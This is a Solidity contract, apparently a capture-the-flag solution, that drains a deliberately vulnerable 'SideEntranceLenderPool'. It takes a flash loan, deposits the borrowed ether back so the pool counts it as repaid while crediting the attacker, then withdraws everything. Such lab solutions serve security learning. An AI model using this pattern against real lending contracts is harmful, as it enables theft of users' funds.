// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;
import { SideEntranceLenderPool } from './SideEntranceLenderPool.sol';
import "solady/src/utils/SafeTransferLib.sol";

contract SideEntranceAttack {
    SideEntranceLenderPool pool;

    constructor(address _pool) {
        pool = SideEntranceLenderPool(_pool);
    }

    function execute() external payable {
        pool.deposit{value: 1000 ether}();
    }
    // Simply use a flash loan to deposit into the pool and update our balance to 1000 ether 
    // the flashloan checks repayment by comparing its own balance before and after the flashloan 
    // since we used the deposit functino to send the ether back the pool balance is the same 
    // before and after the flashloan and the flashloan is successful and our balance is credited
    // then we simply withdraw. 
    function attack() external {
        pool.flashLoan(1000 ether);
        pool.withdraw();
        SafeTransferLib.safeTransferETH(msg.sender, address(this).balance);
    }
    
    receive() external payable {}

}